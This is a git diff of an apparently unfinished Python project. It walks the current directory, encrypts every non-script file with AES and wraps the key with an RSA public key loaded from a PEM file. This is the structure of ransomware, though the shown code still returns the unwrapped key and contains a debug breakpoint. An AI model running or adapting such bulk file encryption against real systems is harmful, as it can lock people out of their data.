@@ -1,7 +1,9 @@
 import os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives import padding, serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import rsa as rsa, padding as opad
+# from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
 import base64
 import pdb
 import Constants as const
@@ -96,6 +98,42 @@ def stringify(item_list):
     
     return stringified_items[0], stringified_items[1], stringified_items[2]
 
+def getPK():
+    private_key = None
+    while True:
+        password = input("Password Required: ")
+        password = bytes(password, "utf-8")
+        # Retrieves Crypto-Key Object from PEM file
+        with open("aliKey.pem", "rb") as key_file:
+                private_key = serialization.load_pem_private_key(
+                    key_file.read(),
+                    password=password,
+                    backend=default_backend())
+        # Retrieve public key from Crypto-Key Object
+        if private_key != None:
+            pk = private_key.public_key()
+            return pk
+
+def MyRSAEncrypt(file_path):
+    # privateKey = genKey()
+    pdb.set_trace()
+    encoded_cipher_text, encoded_IV, encoded_key, file_extension, file_name = MyfileEncrypt(file_path)
+
+    # Load RSA public key
+    public_key = getPK()
+    cipher_key = public_key.encrypt(
+        encoded_key,
+        opad.OAEP(
+            mgf=opad.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None))
+
+        
+
+    return encoded_cipher_text, encoded_IV, encoded_key, file_extension, file_name
+    # return encoded_cipher_text, encoded_IV, encoded_key, file_extension, file_name
+
+
 if __name__ == '__main__':
     #Retrieves the path to the current location of this file
     curr_path = os.getcwd()
@@ -111,13 +149,13 @@ if __name__ == '__main__':
         if(curr_folder == '') :
             remove_list = list(files)
             for i in remove_list:
-                if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc'):
+                if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'):
                     files.remove(i)
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
             file_path = curr_path + curr_folder + "/" + files[i]
             #Generate cipher text, IV, Key, and file extension
-            encoded_cipher, encoded_IV, encoded_key, ext, file = MyfileEncrypt(file_path)
+            encoded_cipher, encoded_IV, encoded_key, ext, file = MyRSAEncrypt(file_path)
             #Stringify the following list
             cipher, IV, key = stringify([encoded_cipher, encoded_IV, encoded_key])
             #Generate map
